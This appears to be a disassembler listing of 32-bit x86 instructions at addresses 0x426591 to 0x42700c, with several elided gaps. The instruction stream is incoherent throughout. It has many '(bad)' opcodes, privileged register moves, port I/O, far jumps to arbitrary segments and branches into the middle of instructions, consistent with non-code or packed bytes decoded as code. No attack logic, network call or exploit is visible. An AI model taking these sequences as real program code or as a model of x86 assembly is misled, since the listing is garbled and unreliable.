  426591:	dec    ecx
  426592:	scas   al,BYTE PTR es:[edi]
  426593:	xor    edx,esp
  426595:	je     0x4265e6
  426597:	push   0x37
  426599:	push   ebx
  42659a:	mov    ebx,0x6e51721f
  42659f:	jl     0x42659a
  4265a1:	int3   
  4265a2:	fmul   QWORD PTR [ecx]
  4265a4:	ret    
  4265a5:	ret    0x546a
  4265a8:	jbe    0x426606
  4265aa:	pop    edi
  4265ab:	mov    edi,cr5
  4265ae:	pop    ds
  4265af:	dec    esp
  4265b0:	sbb    al,BYTE PTR [ecx]
  4265b2:	jo     0x4265f4
  4265b4:	inc    edi
  4265b5:	mov    WORD PTR [esi+0x27],ds
  4265b8:	jp     0x4265cb
  4265ba:	push   ecx
  4265bb:	jecxz  0x4265a5
  4265bd:	stc    
  4265be:	push   ecx
  4265bf:	sub    eax,0x4006e45b
  4265c4:	shl    DWORD PTR [ecx+0x48d3dd78],0xd8
  4265cb:	mov    al,ds:0x7f3bc0d0
  4265d0:	ficomp DWORD PTR [edx-0x58]
  4265d3:	jo     0x426625
  4265d5:	loope  0x426639
  4265d7:	dec    esp
  4265d8:	xor    bh,bh
  4265da:	mov    esp,0x9ff78492
  4265df:	(bad)  
  4265e0:	or     al,0xaf
  4265e2:	enter  0xcb32,0x98
  4265e6:	mov    esp,0x64839501
  4265eb:	and    al,0x72
  4265ed:	pop    eax
  4265ee:	inc    esi
  4265ef:	xlat   BYTE PTR ds:[ebx]
  4265f0:	adc    ah,BYTE PTR [ebx+0x17d2c1d5]
  4265f6:	jae    0x426662
  4265f8:	in     eax,dx
  4265f9:	je     0x23511c32
  4265ff:	aas    
  426600:	xor    eax,0xa121427d
  426605:	dec    ecx
  426606:	scas   eax,DWORD PTR es:[edi]
  426607:	retf   0xf93b
  42660a:	jmp    0x831d:0x9f548f35
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi-0x7c21925c]
  426682:	(bad)  
  426683:	mov    esi,DWORD PTR [ebp+0x500019a]
  426689:	add    DWORD PTR [eax],eax
  42668b:	add    cl,ah
  42668d:	(bad)  
  42668e:	or     ch,BYTE PTR [esi]
  426690:	in     eax,0x4
  426692:	ja     0x426647
  426694:	mov    dh,0xe9
  426696:	fs ret 
  426698:	fistp  QWORD PTR [ecx+0x6f]
  42669b:	ins    DWORD PTR es:[edi],dx
  42669c:	sub    eax,0x561272a8
  4266a1:	pop    edi
  4266a2:	(bad)  
  4266a3:	retf   0xf014
  4266a6:	arpl   cx,dx
  4266a8:	dec    edi
  4266a9:	add    eax,0xd71067e5
  4266ae:	stc    
  4266af:	fwait
  4266b0:	aad    0x58
  4266b2:	xor    al,0x32
  4266b4:	add    esi,DWORD PTR [edi]
  4266b6:	adc    al,0xb7
  4266b8:	pop    edi
  4266b9:	or     eax,0x342185de
  4266be:	sbb    DWORD PTR [edi],ebx
  4266c0:	mov    esi,0x6eb4acb1
  4266c5:	cmp    eax,0x95430c6
  4266ca:	aaa    
  4266cb:	xor    edx,ebx
  4266cd:	mov    ecx,0x412efd89
  4266d2:	cdq    
  4266d3:	inc    edi
  4266d4:	adc    BYTE PTR [edx],ch
  4266d6:	pop    es
  4266d7:	mov    dl,0xf2
  4266d9:	sbb    edx,ebp
  4266db:	xchg   ebp,eax
  4266dc:	pushf  
  4266dd:	bound  ecx,QWORD PTR [esi+0x35]
  4266e0:	or     esp,esp
  4266e2:	aas    
  4266e3:	sub    eax,0xa364215
  4266e8:	mov    BYTE PTR [ebx+edx*1+0x2a],ah
  4266ec:	add    al,0x63
  4266ee:	mov    ecx,0x653278bd
  4266f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f4:	jecxz  0x4266d1
  4266f6:	int    0xe
  4266f8:	push   edx
  4266f9:	xor    ah,BYTE PTR [ecx-0x17]
  4266fc:	fs dec eax
  4266fe:	ficomp WORD PTR [edx+0x4dbfb183]
  426704:	sub    eax,ecx
  426706:	inc    ebp
  426707:	pop    esp
  426708:	push   es
  426709:	lods   eax,DWORD PTR ds:[esi]
  42670a:	mov    DWORD PTR [edi-0x4],edi
  42670d:	pop    edx
  42670e:	dec    edi
  42670f:	and    cl,ah
  426711:	pop    ebp
  426712:	jp     0x426707
  426714:	cwde   
  426715:	dec    eax
  426716:	shl    DWORD PTR [eax+0x55],1
  426719:	lahf   
  42671a:	xor    DWORD PTR [edx-0x6],edx
  42671d:	popa   
  42671e:	lds    eax,FWORD PTR [edi+ebx*1-0x52]
  426722:	fist   WORD PTR [ebx-0x2cf93c80]
  426728:	js     0x4266f3
  42672a:	fcmovne st,st(1)
  42672c:	push   ebp
  42672d:	popa   
  42672e:	mov    ds:0xb18ccfe3,al
  426733:	mov    ds:0x19fb8670,al
  426738:	jae    0x4266c8
  42673a:	pusha  
  42673b:	cmp    al,0x67
  42673d:	nop
  42673e:	pop    esi
  42673f:	mov    edx,0x37038736
  426744:	ret    
  426745:	xor    eax,0xb5391d96
  42674a:	cmc    
  42674b:	std    
  42674c:	push   esi
  42674d:	sub    DWORD PTR [eax],edx
  42674f:	jl     0x4267b1
  426751:	mov    dh,0x7f
  426753:	aaa    
  426754:	dec    ebp
  426755:	jae    0x426715
  426757:	shl    BYTE PTR [esp+eiz*4],1
  42675a:	sub    DWORD PTR [ecx+0x27eab806],esp
  426760:	mov    bl,0x41
  426762:	cmp    ecx,DWORD PTR [edi-0x378dc625]
  426768:	rcl    DWORD PTR [eax-0x2f73dc9b],1
  42676e:	jmp    0x6f5ccbf1
  426773:	add    bh,bl
  426775:	jno    0x4267ad
  426777:	push   0xffffff92
  426779:	pop    esi
  42677a:	jnp    0x42672a
  42677c:	push   ebx
  42677d:	daa    
  42677e:	mov    ebp,0xf2b7cbbe
  426783:	and    cl,BYTE PTR [ecx+0x5b6fa46e]
  426789:	inc    ebp
  42678a:	out    dx,eax
  42678b:	adc    eax,0x35e0be94
  426790:	jecxz  0x426792
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	jb     0x426810
  426802:	sub    ebx,DWORD PTR [ecx]
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [ebx-0x6d3e8795],bl
  426811:	in     al,0xdf
  426813:	cld    
  426814:	dec    ebp
  426815:	(bad)  
  426816:	ficomp DWORD PTR [ecx]
  426818:	add    ebx,esp
  42681a:	lds    edx,FWORD PTR ds:0x5d573f22
  426820:	shl    BYTE PTR [ebx+0x14],cl
  426823:	inc    ebx
  426824:	push   cs
  426825:	xchg   esp,eax
  426826:	push   es
  426827:	fwait
  426828:	push   ds
  426829:	imul   esp,DWORD PTR [edi-0x177a807b],0xe80af810
  426833:	xchg   ecx,eax
  426834:	pop    esp
  426835:	in     al,dx
  426836:	call   0xf67b:0xca7e3340
  42683d:	mov    esp,0x937180bf
  426842:	xchg   esp,eax
  426843:	adc    esi,DWORD PTR [edx-0x656b583a]
  426849:	adc    bh,BYTE PTR [ebp-0x4a]
  42684c:	mov    esi,0x4449496e
  426851:	jge    0x4267ea
  426853:	ins    BYTE PTR es:[edi],dx
  426854:	mov    ecx,0xee878e68
  426859:	in     eax,dx
  42685a:	jno    0x4268a8
  42685c:	sub    eax,0x9e137e0a
  426861:	sbb    al,0x3b
  426863:	daa    
  426864:	fldcw  WORD PTR [eax-0x34]
  426867:	mov    esp,0x1e22011c
  42686c:	xchg   DWORD PTR [ebx],ecx
  42686e:	lds    ecx,FWORD PTR [ecx+esi*1-0x79]
  426872:	(bad)  
  426873:	xor    eax,0x87251b41
  426878:	mov    edi,0xbc460da2
  42687d:	xchg   ebp,eax
  42687e:	mov    esi,0xfdaedd1b
  426883:	add    ch,0xa7
  426886:	ds xchg ecx,eax
  426888:	dec    edx
  426889:	xor    bh,bh
  42688b:	jns    0x426908
  42688d:	stc    
  42688e:	fild   WORD PTR [edi]
  426890:	pushf  
  426891:	jmp    0xf6d18ff4
  426896:	inc    esi
  426897:	cmc    
  426898:	cwde   
  426899:	daa    
  42689a:	sub    ah,cl
  42689c:	ja     0x42683c
  42689e:	sub    DWORD PTR [edx],esp
  4268a0:	out    0x71,al
  4268a2:	nop
  4268a3:	sub    BYTE PTR [ebx],dh
  4268a5:	les    edx,FWORD PTR [eax-0x1ab60c62]
  4268ab:	rcr    DWORD PTR [edx],cl
  4268ad:	ds scas eax,DWORD PTR es:[edi]
  4268af:	jb     0x42691f
  4268b1:	sub    bh,BYTE PTR [ecx]
  4268b3:	inc    esi
  4268b4:	sbb    edi,edx
  4268b6:	scas   al,BYTE PTR es:[edi]
  4268b7:	inc    ebp
  4268b8:	sbb    al,0x68
  4268ba:	aad    0xf4
  4268bc:	clc    
  4268bd:	mov    edi,DWORD PTR ds:0x6e94ea36
  4268c3:	mov    cl,0xb5
  4268c5:	pusha  
  4268c6:	mov    dh,0x82
  4268c8:	mov    esp,ebx
  4268ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268cb:	mov    ecx,0xead2df28
  4268d0:	fidivr DWORD PTR [ebx]
  4268d3:	ins    BYTE PTR es:[edi],dx
  4268d4:	xchg   ecx,eax
  4268d5:	sub    cl,BYTE PTR [ecx+0x20]
  4268d8:	jo     0x4268f9
  4268da:	mov    ah,0xee
  4268dc:	addr16 in al,dx
  4268de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268df:	mov    bl,0x4e
  4268e1:	out    dx,eax
  4268e2:	dec    edi
  4268e3:	push   eax
  4268e4:	jmp    0x56b6:0x8c16b3fa
  4268eb:	fiadd  DWORD PTR [ebp+0x4c]
  4268ee:	stos   BYTE PTR es:[edi],al
  4268ef:	xchg   edi,eax
  4268f0:	xor    eax,0xa1f92dc0
  4268f5:	repnz sub eax,0x1f1c226d
  4268fb:	ds mov bl,0x58
  4268fe:	mul    ecx
  426900:	nop
  426901:	lds    edx,FWORD PTR [edi+0x59]
  426904:	or     cl,dl
  426906:	mov    ds:0xad0e0e20,eax
  42690b:	sbb    BYTE PTR [ebp+0x7d8ed8c3],dh
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    edx,DWORD PTR [ebx-0x40d0a172]
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x5e000001
  42698d:	repnz popa 
  42698f:	push   esp
  426990:	adc    BYTE PTR [eax-0x427fa80],bl
  426996:	add    DWORD PTR [ebx+0x4f],ebp
  426999:	jnp    0x426932
  42699b:	mov    esi,0x30cc3f40
  4269a0:	and    bl,BYTE PTR [ebx]
  4269a2:	mov    edx,ebx
  4269a4:	lods   eax,DWORD PTR ds:[esi]
  4269a5:	in     al,0x8
  4269a7:	sbb    esp,DWORD PTR [ebp+0x507d6d4f]
  4269ad:	les    edx,FWORD PTR [esi+ebp*4-0x2d5f2a25]
  4269b4:	jo     0x4269a2
  4269b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b7:	mov    ebp,0x1440fb4e
  4269bc:	nop
  4269bd:	and    al,BYTE PTR [ebx-0x5d5b7995]
  4269c3:	imul   ecx,DWORD PTR [ecx+0xf],0x38
  4269c7:	inc    edi
  4269c8:	ret    0xfefc
  4269cb:	cmp    eax,0x75f823d7
  4269d0:	inc    eax
  4269d1:	fidivr DWORD PTR [eax+edi*4-0x200f7e1a]
  4269d8:	sti    
  4269d9:	scas   al,BYTE PTR es:[edi]
  4269da:	jnp    0x42696c
  4269dc:	outs   dx,BYTE PTR ds:[esi]
  4269dd:	xchg   edi,eax
  4269de:	imul   ebx,DWORD PTR [edi],0x3c479ee
  4269e4:	pop    ecx
  4269e5:	lods   al,BYTE PTR ds:[esi]
  4269e6:	jnp    0x426a12
  4269e8:	es in  al,0xfd
  4269eb:	sbb    edx,edi
  4269ed:	inc    ebp
  4269ee:	lahf   
  4269ef:	shr    DWORD PTR [ecx],1
  4269f1:	fidiv  DWORD PTR [ebx-0x35cbae8b]
  4269f7:	test   BYTE PTR [esi+0x55a43466],0x14
  4269fe:	sub    BYTE PTR [ecx-0x68a17d3d],dl
  426a04:	fstp   TBYTE PTR [ecx+0x168dbf93]
  426a0a:	call   0x45466916
  426a0f:	jp     0x426996
  426a11:	clc    
  426a12:	cmp    edx,DWORD PTR [ebp-0x26]
  426a15:	ficomp WORD PTR [ebx]
  426a17:	bound  edx,QWORD PTR ds:0xdd7a4f2
  426a1d:	fcomi  st,st(1)
  426a1f:	out    dx,al
  426a20:	ret    0xf6cd
  426a23:	pop    ebx
  426a24:	xor    al,0x4f
  426a26:	je     0x426a6c
  426a28:	or     al,BYTE PTR [ecx-0x56]
  426a2b:	stos   DWORD PTR es:[edi],eax
  426a2c:	or     BYTE PTR [esi-0x55],dl
  426a2f:	mov    al,ds:0x43abdf31
  426a34:	jne    0x426aa2
  426a36:	inc    esi
  426a37:	push   edi
  426a38:	(bad)  
  426a39:	neg    ebp
  426a3b:	and    al,0x69
  426a3d:	jns    0x426a32
  426a3f:	js     0x4269c4
  426a41:	stos   BYTE PTR es:[edi],al
  426a42:	in     al,0x20
  426a44:	push   ds
  426a45:	das    
  426a46:	jbe    0x426a68
  426a48:	inc    edx
  426a49:	push   ecx
  426a4a:	mov    cl,0x8b
  426a4c:	cs cli 
  426a4e:	push   0x23
  426a50:	pop    edx
  426a51:	adc    edx,DWORD PTR [edx]
  426a53:	popf   
  426a54:	sbb    DWORD PTR [edi-0x1e],esp
  426a57:	sbb    BYTE PTR [edi+0x325c8b84],0x45
  426a5e:	lea    esi,[edi+edi*8-0x793d768e]
  426a65:	fld    TBYTE PTR [eax]
  426a67:	out    dx,al
  426a68:	and    eax,0x15fc567b
  426a6d:	retw   0xde85
  426a71:	sub    ecx,esi
  426a73:	sub    al,0x46
  426a75:	and    DWORD PTR [ebx+ebp*8],edx
  426a78:	clc    
  426a79:	inc    edx
  426a7a:	push   ds
  426a7b:	rcr    DWORD PTR [edx+0x347f4036],cl
  426a81:	call   0x8442:0x2b917308
  426a88:	fs ins DWORD PTR es:[edi],dx
  426a8a:	fidiv  DWORD PTR [ecx-0x306c1ecd]
  426a90:	popf   
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x78
  426b01:	pop    ss
  426b02:	fnsave [eax-0x3c]
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0x20000001
  426b0d:	test   esp,0x70eb74db
  426b13:	bound  ebx,QWORD PTR [eax-0x72]
  426b16:	pop    esp
  426b17:	mov    edi,0x690e2eb3
  426b1c:	cmp    eax,0x2d80436c
  426b21:	push   edi
  426b22:	xchg   bh,bh
  426b24:	ja     0x426b35
  426b26:	repz dec ebx
  426b28:	ret    0x90e1
  426b2b:	neg    BYTE PTR [ecx-0x45dee7af]
  426b31:	pushf  
  426b32:	push   cs
  426b33:	push   cs
  426b34:	mov    bh,0x87
  426b36:	inc    edx
  426b37:	xchg   edx,eax
  426b38:	or     al,0x76
  426b3a:	dec    eax
  426b3b:	sti    
  426b3c:	or     eax,0x39bfd687
  426b41:	sbb    al,0x5
  426b43:	jmp    0xbaad:0x3a212f79
  426b4a:	pop    esp
  426b4b:	or     edi,DWORD PTR [ebx+0x476959d3]
  426b51:	inc    eax
  426b52:	jb     0x426b9c
  426b54:	imul   esi,DWORD PTR [edx+0x55d4b2ce],0xffffffa8
  426b5b:	out    0x29,al
  426b5d:	or     eax,0x11a49bed
  426b62:	int3   
  426b63:	cmp    DWORD PTR [ecx-0x344740e9],esp
  426b69:	repz and BYTE PTR [ebx],ch
  426b6c:	popf   
  426b6d:	add    al,0xcc
  426b6f:	out    dx,eax
  426b70:	arpl   WORD PTR [ecx],bp
  426b72:	daa    
  426b73:	(bad)  
  426b75:	push   es
  426b76:	loope  0x426b9d
  426b78:	push   0xcecc68b7
  426b7d:	mul    BYTE PTR [esi-0x57c2e069]
  426b83:	lahf   
  426b84:	cmp    BYTE PTR ds:0x3ca9a443,bh
  426b8a:	xchg   BYTE PTR [eax-0x32376766],cl
  426b90:	pop    esi
  426b91:	sar    cl,1
  426b93:	inc    esi
  426b94:	loopne 0x426b3e
  426b96:	xchg   ebx,eax
  426b97:	aaa    
  426b98:	retf   0x7fac
  426b9b:	jmp    0x41d:0xbcdaf77
  426ba2:	test   eax,edi
  426ba4:	sti    
  426ba5:	push   cs
  426ba6:	sbb    eax,0x46d037ec
  426bab:	jae    0x426b3e
  426bad:	mov    WORD PTR [edi-0x25],ss
  426bb0:	xchg   ebp,eax
  426bb1:	inc    eax
  426bb2:	ss adc al,0x4a
  426bb5:	or     BYTE PTR [ecx+0x35],0x4f
  426bb9:	bound  ecx,QWORD PTR [edx]
  426bbb:	xlat   BYTE PTR ds:[ebx]
  426bbc:	dec    eax
  426bbd:	repz add al,BYTE PTR [edi-0x7efda419]
  426bc4:	je     0x426c35
  426bc6:	adc    BYTE PTR [ecx-0x5c0c5f51],0x9f
  426bcd:	xchg   ecx,eax
  426bce:	mov    DWORD PTR [esi-0x4f],esi
  426bd1:	outs   dx,BYTE PTR ds:[esi]
  426bd2:	sub    al,BYTE PTR [eax-0x1c1ca107]
  426bd8:	inc    esi
  426bd9:	sbb    esp,DWORD PTR [ebx]
  426bdb:	cmp    eax,0x1392e364
  426be0:	sub    BYTE PTR [edi+esi*4],bl
  426be3:	pop    ds
  426be4:	push   ss
  426be5:	fisttp QWORD PTR [ebp+0x19]
  426be8:	lock sbb eax,0x74fd464d
  426bee:	in     eax,dx
  426bef:	shl    ch,0xfc
  426bf2:	xchg   esi,eax
  426bf3:	sub    esi,DWORD PTR ds:0x9db76ad9
  426bf9:	or     DWORD PTR [ebx-0x73],0x91363235
  426c00:	pop    edi
  426c01:	sub    BYTE PTR [ecx+0x2c4fcab6],0xba
  426c08:	jl     0x426c78
  426c0a:	fcomi  st,st(5)
  426c0c:	std    
  426c0d:	in     al,dx
  426c0e:	repz xor eax,0xa1
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xacada650
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x16000001
  426c8d:	mov    BYTE PTR [eax-0x52],dh
  426c90:	push   esp
  426c91:	pop    ebp
  426c92:	sti    
  426c93:	in     eax,0x7f
  426c95:	out    dx,al
  426c96:	clc    
  426c97:	xchg   esp,eax
  426c98:	pop    ebp
  426c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c9a:	push   esi
  426c9b:	inc    esi
  426c9c:	sahf   
  426c9d:	pop    esi
  426c9e:	jno    0x426c9f
  426ca0:	push   esi
  426ca1:	or     eax,0xe2a97b55
  426ca6:	inc    edi
  426ca7:	dec    ebp
  426ca8:	jp     0x426c6e
  426caa:	sub    eax,0x7d9a3a31
  426caf:	arpl   bx,si
  426cb1:	adc    DWORD PTR [eax+0x6f],0x79c592fb
  426cb8:	jge    0x426c96
  426cba:	fisub  WORD PTR [ecx]
  426cbc:	mov    gs,WORD PTR gs:[eax]
  426cbf:	dec    edx
  426cc0:	fstp   QWORD PTR [edx-0x73ceb16b]
  426cc6:	les    esp,FWORD PTR [eax+0x58]
  426cc9:	es pop esp
  426ccb:	cmp    cl,BYTE PTR [edx+0x55f84c82]
  426cd1:	and    DWORD PTR [ebx-0x65437beb],esp
  426cd7:	jne    0x426cca
  426cd9:	leave  
  426cda:	mov    esp,0xf0134fd9
  426cdf:	mov    ch,0x78
  426ce1:	add    ebx,DWORD PTR ds:0x7b726c91
  426ce7:	(bad)  
  426ce8:	enter  0xc55c,0x6d
  426cec:	jmp    0x426cf6
  426cee:	xchg   edx,eax
  426cef:	push   es
  426cf0:	sub    al,0x1a
  426cf2:	jp     0x426ce9
  426cf4:	and    edx,DWORD PTR [edi+ebx*4+0x3f]
  426cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cf9:	mov    bh,0x82
  426cfb:	loopne 0x426cf6
  426cfd:	and    eax,0x1ba24cc9
  426d02:	in     eax,0x59
  426d04:	lods   al,BYTE PTR ds:[esi]
  426d05:	out    dx,al
  426d06:	pop    esi
  426d07:	mov    BYTE PTR [ebp-0x2c],cl
  426d0a:	dec    edi
  426d0b:	in     al,dx
  426d0c:	dec    DWORD PTR [ecx]
  426d0e:	mov    bh,0x90
  426d10:	addr16 (bad) 
  426d12:	mov    al,0xe
  426d14:	sub    bl,BYTE PTR [ecx-0x118484a6]
  426d1a:	mov    ds:0x956747be,al
  426d1f:	or     BYTE PTR [esi-0xeeabc6a],bh
  426d25:	adc    edi,ecx
  426d27:	ror    BYTE PTR [esi+0x5f],cl
  426d2a:	xor    eax,0x60cf98f
  426d2f:	lock stc 
  426d31:	test   BYTE PTR [ebx+0xb],bh
  426d34:	pusha  
  426d35:	xchg   DWORD PTR [ecx+0x69],ebx
  426d38:	outs   dx,BYTE PTR ds:[esi]
  426d39:	mov    bl,0x85
  426d3b:	mov    bh,0x6
  426d3d:	mov    edi,0xf744ad65
  426d42:	scas   eax,DWORD PTR es:[edi]
  426d43:	jmp    0x76bb:0xe205dcad
  426d4a:	dec    edi
  426d4b:	pop    ebp
  426d4c:	inc    esi
  426d4d:	adc    esi,edx
  426d4f:	imul   esp,DWORD PTR ds:0x2ecc4a21,0x212e046e
  426d59:	sbb    bh,BYTE PTR [ebp+0x4]
  426d5c:	das    
  426d5d:	popa   
  426d5e:	xchg   BYTE PTR [edx],dl
  426d60:	loope  0x426d78
  426d62:	stos   BYTE PTR es:[edi],al
  426d63:	in     eax,0x43
  426d65:	or     edx,ebx
  426d67:	aaa    
  426d68:	add    al,0x7d
  426d6a:	loop   0x426d4e
  426d6c:	and    dh,BYTE PTR [ebp+0x21]
  426d6f:	adc    al,0x5a
  426d71:	out    0x96,al
  426d73:	das    
  426d74:	jno    0x426d3a
  426d76:	ds cmp eax,0x583fc475
  426d7c:	push   es
  426d7d:	ins    BYTE PTR es:[edi],dx
  426d7e:	mov    esp,0xc9e1543a
  426d83:	adc    al,0x99
  426d85:	in     eax,dx
  426d86:	dec    eax
  426d88:	xor    ah,0xd4
  426d8b:	adc    al,0x34
  426d8d:	cmp    al,0x93
  426d8f:	shl    edx,cl
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x840c:0xc7c2ecf9
  426e01:	add    eax,0x9fce1372
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0xbb000001
  426e0d:	mov    ebp,0x8b8b41ec
  426e12:	xchg   ecx,eax
  426e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e14:	or     esi,DWORD PTR [ecx+edi*2+0x35]
  426e18:	lea    eax,[edi]
  426e1a:	xor    al,0xc5
  426e1c:	dec    ebx
  426e1d:	addr16 out 0x83,eax
  426e20:	call   0xbb074dfb
  426e25:	int3   
  426e26:	cmp    DWORD PTR [esi+0x10f1880c],0x6b
  426e2d:	mov    ds:0x4b8fcf0f,eax
  426e32:	fidiv  WORD PTR [edi]
  426e34:	ss dec esi
  426e36:	mov    edi,0xa2be814
  426e3b:	sbb    DWORD PTR [ecx+0x50],0x7dde907b
  426e42:	xlat   BYTE PTR ds:[ebx]
  426e43:	outs   dx,DWORD PTR ds:[esi]
  426e44:	inc    ebp
  426e45:	les    esp,FWORD PTR [eax-0x61]
  426e48:	int3   
  426e49:	fwait
  426e4a:	(bad)  
  426e4b:	xor    DWORD PTR [ebx+ebx*8],eax
  426e4e:	rcl    bh,0xbf
  426e51:	cmp    dl,cl
  426e53:	jbe    0x426e0a
  426e55:	call   0x431b:0x1ebb14c1
  426e5c:	jl     0x426e33
  426e5e:	and    DWORD PTR [esi-0x13a557db],esp
  426e64:	dec    eax
  426e65:	imul   ebp,DWORD PTR [edx-0x11],0xbf012305
  426e6c:	jge    0x426e0d
  426e6e:	jne    0x426e2c
  426e70:	jecxz  0x426e2a
  426e72:	sbb    al,bh
  426e74:	dec    cl
  426e76:	xchg   ebp,eax
  426e77:	jecxz  0x426ea2
  426e79:	fsubr  DWORD PTR ds:0xe3464bfa
  426e7f:	xchg   ebp,eax
  426e80:	add    edi,DWORD PTR [edi]
  426e82:	mov    ch,0xe2
  426e84:	adc    DWORD PTR ds:0x5f61015f,ecx
  426e8a:	repnz pop ds
  426e8c:	pop    ebp
  426e8d:	ins    BYTE PTR es:[edi],dx
  426e8e:	push   esi
  426e8f:	hlt    
  426e90:	add    dh,BYTE PTR [esi+0x195c3b10]
  426e96:	fist   WORD PTR [ebx+0x75fb1ada]
  426e9c:	out    0xab,eax
  426e9e:	test   DWORD PTR [eax+ebp*8],0xfa6a194e
  426ea5:	arpl   WORD PTR [esi+ebp*4+0x4f],bp
  426ea9:	push   eax
  426eaa:	outs   dx,DWORD PTR ds:[esi]
  426eab:	popf   
  426eac:	jl     0x426f29
  426eae:	dec    ecx
  426eaf:	mov    bh,0x30
  426eb1:	jle    0x426f01
  426eb3:	out    dx,al
  426eb4:	iret   
  426eb5:	xlat   BYTE PTR ds:[ebx]
  426eb6:	and    DWORD PTR [eax-0x3c155d7c],eax
  426ebc:	jae    0x426e93
  426ebe:	ret    0x8ade
  426ec1:	loop   0x426e56
  426ec3:	pushf  
  426ec4:	sub    al,0xb6
  426ec6:	leave  
  426ec7:	mov    ah,0xcc
  426ec9:	mov    ebx,edi
  426ecb:	aas    
  426ecc:	pop    esp
  426ecd:	ret    0xd1bb
  426ed0:	cli    
  426ed1:	(bad)  
  426ed2:	jl     0x426f51
  426ed4:	fst    QWORD PTR [edx+0x4746a549]
  426eda:	pop    eax
  426edb:	ins    DWORD PTR es:[edi],dx
  426edc:	nop
  426edd:	bound  esi,QWORD PTR [ebx+0x7e]
  426ee0:	loopne 0x426eb1
  426ee2:	push   cs
  426ee3:	pop    edx
  426ee4:	cwde   
  426ee5:	push   ebx
  426ee6:	adc    ebp,edi
  426ee8:	xor    DWORD PTR ds:[ebx+0x59],edx
  426eec:	leave  
  426eed:	dec    eax
  426eee:	fmul   QWORD PTR [edi*1+0x7af9b217]
  426ef5:	sbb    eax,eax
  426ef7:	js     0x426f47
  426ef9:	mov    dl,0xf
  426efb:	push   gs
  426efd:	mov    bl,0xd
  426eff:	cmp    al,0x0
  426f01:	loopne 0x426eb0
  426f03:	push   0xab66df14
  426f08:	pop    ebx
  426f09:	adc    ebx,DWORD PTR [esi-0x63f58bc7]
  426f0f:	mov    ch,0x3c
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+esi*4-0x2c8634e6],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	lea    esi,ds:[ecx-0x7893aaf]
  426f93:	pop    esp
  426f94:	pop    ds
  426f95:	pop    esp
  426f96:	cmp    DWORD PTR ds:[edx+eax*4-0x67],ebx
  426f9b:	dec    esi
  426f9c:	cdq    
  426f9d:	stos   BYTE PTR es:[edi],al
  426f9e:	push   ss
  426f9f:	mov    eax,ds:0x6fbdd2d2
  426fa4:	data16 in al,dx
  426fa6:	mov    ebx,0x88367c01
  426fab:	stos   BYTE PTR es:[edi],al
  426fac:	cs jbe 0x426ff3
  426faf:	les    esp,FWORD PTR [ebp-0x6]
  426fb2:	es mov al,ch
  426fb5:	shr    edx,1
  426fb7:	inc    edi
  426fb8:	sub    cl,ah
  426fba:	stos   BYTE PTR es:[edi],al
  426fbb:	(bad)  
  426fbc:	pop    esi
  426fbd:	inc    eax
  426fbe:	sti    
  426fbf:	std    
  426fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fc1:	icebp  
  426fc2:	popa   
  426fc3:	dec    esp
  426fc4:	cmc    
  426fc5:	pop    esp
  426fc6:	lds    eax,FWORD PTR [esi+0x2c]
  426fc9:	cwde   
  426fca:	arpl   bx,di
  426fcc:	repz pushf 
  426fce:	(bad)  
  426fcf:	hlt    
  426fd0:	mov    ds:0xebfa3ec6,al
  426fd5:	jl     0x427005
  426fd7:	int3   
  426fd8:	dec    ebp
  426fd9:	jg     0x427034
  426fdb:	mov    ds:0x51a0ee4,al
  426fe0:	push   ecx
  426fe1:	ins    DWORD PTR es:[edi],dx
  426fe2:	add    BYTE PTR [ebx+eiz*8],dh
  426fe5:	mov    al,ds:0x9c470688
  426fea:	sti    
  426feb:	test   al,0xd9
  426fed:	pop    edx
  426fee:	gs mov cl,0xdb
  426ff1:	cmp    eax,0xe377d04f
  426ff6:	adc    ecx,eax
  426ff8:	pop    ecx
  426ff9:	push   esp
  426ffa:	lea    ebp,[ebp+0x2b]
  426ffd:	xchg   ebx,eax
  426ffe:	sub    al,0x30
  427000:	add    dl,BYTE PTR [ecx-0x438b4ee2]
  427006:	retf   0xf5a3
  427009:	les    esp,FWORD PTR [esi]
  42700b:	(bad)  
  42700c:	xlat   BYTE PTR ds:[ebx]
